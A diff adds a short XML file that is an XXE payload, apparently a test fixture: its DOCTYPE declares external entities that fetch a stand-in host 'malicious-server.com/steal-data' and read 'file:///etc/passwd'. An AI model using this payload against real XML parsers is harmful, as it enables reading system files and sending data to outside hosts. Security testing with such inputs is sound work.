@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+    <!ENTITY malicious SYSTEM "http://malicious-server.com/steal-data">
+    <!ENTITY local SYSTEM "file:///etc/passwd">
+]>
+<root>
+    <data>&malicious;</data>
+    <data>&local;</data>
+</root>
